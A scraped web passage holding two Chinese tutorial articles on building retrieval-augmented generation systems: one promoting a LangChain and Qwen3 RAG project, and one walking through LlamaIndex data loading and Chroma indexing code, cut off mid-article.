  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T13:04:04.000Z" title="Mon Nov 24 2025 13:04:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p>大模型虽然强大，但依然存在两大痛点：</p>
<ul>
<li><strong>幻觉问题</strong>：模型可能在缺乏事实支撑时“编造答案”；</li>
<li><strong>知识断层</strong>：只能依赖训练时的存量知识，无法覆盖最新或垂直领域的信息。</li>
</ul>
<p>这时，<strong>RAG（检索增强生成）</strong> 成为解决方案。它的思路很直接：</p>
<ol>
<li><strong>先检索</strong>→从外部知识库找到相关信息；</li>
<li><strong>再生成</strong>→把检索结果交给大模型回答问题。</li>
</ol>
<p>这种“检索+生成”的组合，不仅能降低幻觉率，还能让模型更快适应新的知识场景。</p>
<p>本期推荐和鲸社区创作者@云逸～分享的LangChain RAG系统实战项目，其完整演示了如何结合<strong>LangChain框架</strong>与<strong>Qwen3模型</strong>，从数据索引到接口服务，搭建出一个可落地的RAG问答系统。</p>
<h2 data-id="heading-0">为什么选择LangChain？</h2>
<p>实现一个RAG系统并不复杂，但要把整个链路从数据加载、向量化、检索、排序到生成打通，过程冗长。<strong>LangChain</strong>的优势就在于它的模块化和生态支持：</p>
<ul>
<li><strong>现成组件</strong>：数据切分、向量数据库、检索器、问答链等开箱即用；</li>
<li><strong>生态丰富</strong>：支持FAISS、Milvus、Pinecone等数据库，也兼容OpenAI、Qwen等Embedding和LLM；</li>
<li><strong>可扩展</strong>：不仅能做RAG，还能扩展到多步推理、工具调用、对话记忆等复杂应用。</li>
</ul>
<p>这意味着开发者可以把更多精力放在业务逻辑和效果优化上，而不是从零造轮子。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4b479330c8442dc9cf3fc2343f2fb8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594244&amp;x-signature=%2BJ3tiFsXHr4bGHeXgkSBqRD%2B2qo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">干货解析：RAG三步走</h2>
<p>在项目中，RAG 的核心流程被拆解为三步，每一步都有清晰的实现：</p>
<h3 data-id="heading-2">构建索引：让文档“能被理解”</h3>
<ul>
<li><strong>项目做法</strong>：加载四大名著等中文古典小说，先切分成合适的片段，再用<strong>Qwen3-Embedding-4B</strong>将其向量化。</li>
<li><strong>价值</strong>：Embedding 把文本变成“语义坐标”，存入<strong>FAISS向量数据库</strong>，让模型能按语义相似度检索，而不是死板的关键词匹配。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc4e77f549204ce59fa1b36c996edd06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594244&amp;x-signature=N6CrO0BESML0H66HknHtuCnSC1w%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">检索与精排：找到最相关的信息</h3>
<ul>
<li><strong>项目做法</strong>：当用户提问时，系统会用向量检索召回候选片段，再用<strong>Qwen3-Reranker-4B</strong>对结果精排序。</li>
<li><strong>价值</strong>：粗召回保证覆盖面，精排保证准确性。这一步解决了很多“检索结果不准”的问题，让答案更贴近用户问题。</li>
</ul>
<h3 data-id="heading-4"/>
<h3 data-id="heading-5"/>
<h3 data-id="heading-6">生成回答：大模型“有据可依”</h3>
<ul>
<li><strong>项目做法</strong>：将排序后的上下文与问题一起打包成prompt，交给大模型，通过<strong>LangChain的RetrievalQA模块</strong>生成答案。</li>
<li><strong>价值</strong>：大模型的输出不再是“瞎编”，而是基于检索结果的总结与推理，显著降低幻觉。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67c3718a754f41089d41d9219d908fd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594244&amp;x-signature=zaYEOLWCFMv7BW%2FVCz%2F9hwVs1gQ%3D" alt="" loading="lazy"/></p>
<p>通过这三步，项目打通了RAG的完整闭环，形成了一个可实际使用的问答系统。</p>
<h2 data-id="heading-7">项目亮点</h2>
<ul>
<li><strong>Embedding+Reranker组合</strong>：使用<strong>Qwen3-Embedding-4B</strong>做语义检索，<strong>Qwen3-Reranker-4B</strong>精排序，极大提升检索结果的相关性。</li>
<li><strong>全流程打通</strong>：从文档加载、索引构建，到FastAPI服务上线，完整覆盖从研发到应用全过程。</li>
<li><strong>真实调试经验</strong>：项目中记录了显存溢出、类型报错等常见问题及解决方案，贴近一线开发实践。</li>
<li><strong>扩展性强</strong>：项目留出了优化空间，比如更灵活的分块策略、更智能的prompt设计，适合二次开发。</li>
</ul>
<p>💻一键Fork项目：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.heywhale.com%2Fu%2Fbf1ecb" target="_blank" title="https://www.heywhale.com/u/bf1ecb" ref="nofollow noopener noreferrer">www.heywhale.com/u/bf1ecb</a>（复制至浏览器打开）</p>
<h2 data-id="heading-8">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[构建Agents框架｜LlamaIndex使用实战之RAG]]></title>    <link>https://juejin.cn/post/7576129509934694419</link>    <guid>https://juejin.cn/post/7576129509934694419</guid>    <pubDate>2025-11-24T13:13:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576129509934694419" data-draft-id="7576273949178200127" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="构建Agents框架｜LlamaIndex使用实战之RAG"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-11-24T13:13:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            构建Agents框架｜LlamaIndex使用实战之RAG
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T13:13:47.000Z" title="Mon Nov 24 2025 13:13:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<h2 data-id="heading-0"><strong>01 前言</strong></h2>
<p>RAG（Retrieval Augmented Generation：检索增强生成）是LlamaIndex的核心功能模块，覆盖了从<strong>数据加载</strong>、<strong>索引构建</strong>到<strong>存储管理及检索</strong>的全流程。其数据连接与加载能力，更是LlamaIndex早期开源阶段的一大亮点。通过连接和检索特定数据片段，RAG不仅有效解决了大语言模型（LLM）面临的上下文长度限制，也保障了私有领域数据的安全。</p>
<h2 data-id="heading-1"><strong>02 RAG介绍</strong></h2>
<p><strong>RAG（Retrieval Augmented Generation：检索增强生成）</strong> 是一种增强大模型上下文来提高大模型回答准确性的有效且重要手段。通过检索特定内容也保障了企业数据的安全。</p>
<p>其流程如下(图来自官方)：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ae194124bdd419f82dc6d9115a5ae94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594827&amp;x-signature=YA7X78CwFzk81tpdkEvBJkriiPY%3D" alt="" loading="lazy"/></p>
<p>核心步骤包括：</p>
<ul>
<li>
<p><strong>Loading：</strong></p>
<p>数据加载，通过加载不同的数据源进行数据获取，如数据库、PDF、API接口等等方式，LlamaIndex目前支持上百种数据源的连接。</p>
</li>
<li>
<p><strong>Indexing：</strong></p>
<p>索引构建，包括对加载数据分块、向量化以及元数据提取，向量化通常被用于语义匹配。</p>
</li>
<li>
<p><strong>Storing：</strong></p>
<p>存储，对构建的向量数据和元数据进行存储，避免对源数据进行多次向量化操作。</p>
</li>
<li>
<p><strong>Querying：</strong></p>
<p>检索，根据用户问题对数据进行检索召回，并加入到大模型的上下文中。常见检索的方式包括向量化语义检索同时伴有元数据过滤、全文关键词检索、混合检索并应用重排序等。</p>
</li>
<li>
<p><strong>Evaluating：</strong> 评估效果，RAG的效果评估是对结果的检验，也是进行优化索引和检索的依据。</p>
</li>
</ul>
<h2 data-id="heading-2"><strong>03 LlamaIndex的RAG实战</strong></h2>
<p><strong>数据加载</strong></p>
<p>LlamaIndex提供了上百种连接数据的方式，包括：<strong>本地文件加载</strong>、<strong>集成连接器</strong>（可以通过llamahub搜索）、<strong>通过文本创建Document</strong>。加载后的数据都统一转换成Document类对象。</p>
<p><strong>1、本地文件加载</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> llama_index.core <span class="hljs-keyword">import</span> SimpleDirectoryReader
documents = SimpleDirectoryReader(<span class="hljs-string">"../data"</span>).load_data()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"document length:<span class="hljs-subst">{<span class="hljs-built_in">len</span>(documents)}</span>, document:<span class="hljs-subst">{documents}</span>"</span>)
</code></pre>
<p>LlamaIndex中定义了SimpleDirectoryReader类，是内置的最简单的方式，对本地文件进行加载。示例中会加载当前目录的上级data目录下所有文件。</p>
<p><strong>2、集成连接器</strong></p>
<p>以DB为例，通过连接DB，执行Sql查询的每一条数据都是一个Document。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># pip3 install llama-index-readers-database</span>
from llama_index.readers.database import DatabaseReader
<span class="hljs-comment"># 使用PyMySQL：pip3 install pymysql</span>
<span class="hljs-comment"># {root}换成密码</span>
<span class="hljs-attr">reader_media</span> = DatabaseReader(
<span class="hljs-attr">uri</span>=<span class="hljs-string">"mysql+pymysql://root:{root}@localhost:3306/demo"</span>,
<span class="hljs-attr">schema</span>=<span class="hljs-string">"demo"</span>,  <span class="hljs-comment"># optional namespace</span>
)
<span class="hljs-comment"># 加载</span>
<span class="hljs-attr">docs</span> = reader_media.load_data(
<span class="hljs-attr">query</span>=<span class="hljs-string">"SELECT id,username,age,sex,register_time,address FROM xudj.user;"</span>,
<span class="hljs-comment"># 元数据列</span>
<span class="hljs-attr">metadata_cols</span>=[
(<span class="hljs-string">"id"</span>, <span class="hljs-string">"user_id"</span>), <span class="hljs-comment"># 参数转换，用user_id替代id存储</span>
<span class="hljs-string">"username"</span>,
],  <span class="hljs-comment"># map / include in metadata</span>
<span class="hljs-attr">excluded_text_cols</span>=[<span class="hljs-string">"address"</span>],  <span class="hljs-comment"># 剔除字段</span>
<span class="hljs-attr">document_id</span>=lambda row: f<span class="hljs-string">"xudj-user-{row['id']}"</span>,  <span class="hljs-comment"># custom document id</span>
)
print(docs)
</code></pre>
<p>示例首先导入数据库相关依赖，这里使用的是Mysql，可以通过llamahub.ai/?tab=readers搜索使用方式，然后定义DatabaseReader配置连接信息，再调用load_data执行sql完成数据加载。</p>
<p><strong>3、通过文本创建Document</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> llama_index.core <span class="hljs-keyword">import</span> Document
doc = Document(doc_id=<span class="hljs-string">"1"</span>, text=<span class="hljs-string">"文本创建"</span>, metadata={<span class="hljs-string">"id"</span>:<span class="hljs-string">"1"</span>, <span class="hljs-string">"type"</span>:<span class="hljs-string">"custom"</span>})
<span class="hljs-built_in">print</span>(doc)
<span class="hljs-built_in">print</span>(doc.metadata)
</code></pre>
<p>有了文本，这是最直接的方式。</p>
<p><strong>索引构建</strong></p>
<p>数据加载后，有了一系列的Document，便可以进行<strong>索引的构建</strong>。包括长文本按特定规则分块、提取元数据、向量化处理。</p>
<pre><code class="hljs language-ini" lang="ini">from llama_index.core.node_parser import TokenTextSplitter
from llama_index.core import VectorStoreIndex
from llama_index.core import Settings
from llama_index.embeddings.dashscope import DashScopeEmbedding
from llama_index.core import StorageContext
<span class="hljs-comment"># pip install chromadb</span>
<span class="hljs-comment"># pip install llama-index-vector-stores-chroma</span>
import chromadb
from llama_index.vector_stores.chroma import ChromaVectorStore
<span class="hljs-comment"># 1、分块 - chunk_size每块的token数</span>
<span class="hljs-attr">text_splitter</span> = TokenTextSplitter(chunk_size=<span class="hljs-number">200</span>, chunk_overlap=<span class="hljs-number">5</span>)
<span class="hljs-comment"># 2、向量化模型，使用千问的模型</span>
<span class="hljs-attr">dashscope_embed_model</span> = DashScopeEmbedding(
<span class="hljs-attr">model_name</span>=<span class="hljs-string">"text-embedding-v2"</span>,
<span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-..."</span>)
<span class="hljs-comment"># 向量化存储，默认使用基于内存的SimpleVectorStore类</span>
<span class="hljs-comment"># 初始化客户端，设置保存数据的路径</span>
<span class="hljs-attr">db</span> = chromadb.PersistentClient(path=<span class="hljs-string">"./chroma_db"</span>)
<span class="hljs-comment"># 3、创建向量存储上下文</span>
<span class="hljs-attr">chroma_collection</span> = db.get_or_create_collection(<span class="hljs-string">"quickstart"</span>)
<span class="hljs-attr">vector_store</span> = ChromaVectorStore(chroma_collection=chroma_collection)
<span class="hljs-attr">storage_context</span> = StorageContext.from_defaults(vector_store=vector_store)
<span class="hljs-comment"># 4、创建index</span>
<span class="hljs-attr">index</span> = VectorStoreIndex.from_documents(
<span class="hljs-attr">documents</span>=documents,
<span class="hljs-attr">transformations</span>=[text_splitter],
<span class="hljs-attr">embed_model</span>=dashscope_embed_model,
<span class="hljs-attr">insert_batch_size</span>=<span class="hljs-number">5</span>,  <span class="hljs-comment"># 限制每次插入的节点数量</span>
<span class="hljs-attr">storage_context</span>=storage_context,
)
</code></pre>
<p>示例包括4部分（下面序号对应代码注释序号）：</p>
